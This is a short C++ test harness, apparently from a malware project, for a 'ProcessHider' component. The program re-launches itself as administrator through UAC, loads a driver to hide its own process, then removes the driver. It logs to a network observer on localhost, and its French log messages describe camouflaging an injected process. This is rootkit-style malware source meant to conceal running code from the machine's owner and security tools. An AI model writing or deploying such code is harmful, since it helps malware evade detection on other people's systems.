#include <malicious/ProcessHider.hpp>
#include <system/Uac.hpp>
#include <system/ThisProcess.hpp>
#include <common/Logger.hpp>
using namespace Malicious;
using namespace System;

int main()
{
    try
	{
        LOG.setHeader("TEST HIDEPROC");
	    LOG.addObserver(new Common::LoggingNetwork("127.0.0.1", 80));
        LOG.trace();

        ThisProcess thisProcess;
        if(!System::isAdministrator())
	    {
            LOG << "Try to run as administrator.";
		    System::RunAsAdministrator(thisProcess.getProgramName(), thisProcess.getProgramDir(), true);
		    return EXIT_SUCCESS;
	    }

        LOG << "Camouflage du processus injecte.";
        ProcessHider hider;
        
		hider.hide(thisProcess.getProgramName());

        SHOW_BOX("Hider result.", "Click to remove driver.");

        hider.remove();

        SHOW_BOX("Hider result.", "Driver removed.");
	}
    catch(ProcessHider::DriverError&)
    {
        LOG << "Erreur de driver.\n";
    }
	catch(...)
	{
		LOG << "Erreur d'origine inconnue.";
	}
}